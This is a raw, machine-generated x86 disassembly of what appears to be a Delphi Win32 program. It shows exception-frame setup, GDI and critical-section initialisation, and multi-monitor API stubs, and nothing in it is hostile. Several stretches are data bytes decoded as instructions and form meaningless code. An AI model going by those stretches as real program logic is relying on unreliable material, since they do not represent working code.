push sub_4237fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423802
mov eax [ ebp - 0x4 ]
call sub_4235f0
retn
mov esp ebp
pop ebp
retn
sub_423828
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c268
push eax
mov eax ebx
call sub_41c268
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_4235fc
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_423860
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423929
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423930
retn
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
call sub_4208c8
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a68
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a68
sub_423934
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423438
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_4234b4
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41b9ac ]
call sub_41ba20
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b9ac ]
call sub_41ba20
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41b9ac ]
call sub_41ba20
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423580
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c88
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c88
mov [ rw-data ] eax
mov ecx sub_41c278
mov edx sub_41c288
mov eax [ sub_41aa90 ]
call sub_41343c
mov ecx r-xdata
mov edx sub_41c490
mov eax [ r-xdata ]
call sub_41343c
sub_423a40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423a65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a6c
retn
sub_423a7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x3a
inc edx
add [ eax + eax ] dl
add [ eax ] al
or al 0x17
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
clc
cmp [ ecx ] al
pushfd
cmp al [ ecx ]
add [ edx + eax * 2 ] bh
add [ ecx + edi + 0x41 ] cl
add al cl
cmp [ ecx ] eax
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x800423b ]
add [ eax ] al
add al ah
cmp al [ edx ]
fdiv [ eax + eax * 2 ]
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ edx + eax * 2 ] bh
add ah ch
cmp al 0x42
add ah cl
cmp al 0x42
add [ eax + 0x600423c ] bh
sub al 0x3b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
cmp eax [ edx ]
or [ eax ] al
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ edx + eax * 2 ] bh
add [ eax - 0x33ffbfd6 ] bl
cmp al 0x42
add [ eax + 0xc00423c ] bh
push esp
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413c84
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x9400408d
cmp eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax edi
call sub_403290
sub_423ba8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_423c00
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_413c84
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403290
sub_423c44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_423c88
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_423ccc
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413964
mov eax esi
pop esi
pop ebx
retn
sub_423cf8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423d1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d24
retn
sub_423df4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423e19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e20
retn
sub_423e2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404490
xor eax eax
push ebp
push sub_423eeb
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ef2
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044a0
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_423e2c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fe0
sub_423f14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_423e2c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_423f9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_423e2c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42402c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_423e2c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_423f9c
sub_4240c2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_423e2c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_424143
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_423e2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424230
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_423e2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424304
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_423e2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4243d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_423e2c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_424573
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_424599
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245a0
retn
sub_4245b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4245d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245e0
retn
sub_4245ed
inc ebp
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245e0
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
inc edi
inc edx
add [ eax + eax ] cl
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x46587265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ esi + eax * 2 + 0x42 ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jae r-xdata
push esi
je r-xdata
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
push 0xd800406f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0xc0042 ] dl
outsb
je r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
inc edi
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x424628c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
outsb
je r-xdata
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax + 0x6f ] ch
inc eax
add al bl
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0xf800408d
inc edi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
inc edi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
dec eax
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x46 ] bl
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x46947265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x424714c0 ]
inc esi
inc edx
add bh bh
call esp
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
inc esi
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x424698c0 ]
add [ edi ] cl
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42537f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
lea eax [ eax ]
xchg esp eax
inc edi
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x47940040 ]
jo r-xdata
cmp cl [ ecx ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_404034
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425386
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a68
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423be4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405664
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405690
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4249b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_424a26
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_424b3c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405664
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a2d
lea eax [ ebp - 0x8 ]
call sub_40564c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov [ rw-data ] eax
sub_424a34
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424ac8
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405690
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_424a8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405664
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_424ac8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_423ba8
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423ba8
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423ba8
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403fe0
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_424b3c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_424c3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423bf8
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40564c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40ce0c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40564c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40ce0c
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423bf8
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424a8c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423bf8
mov ecx r-xdata
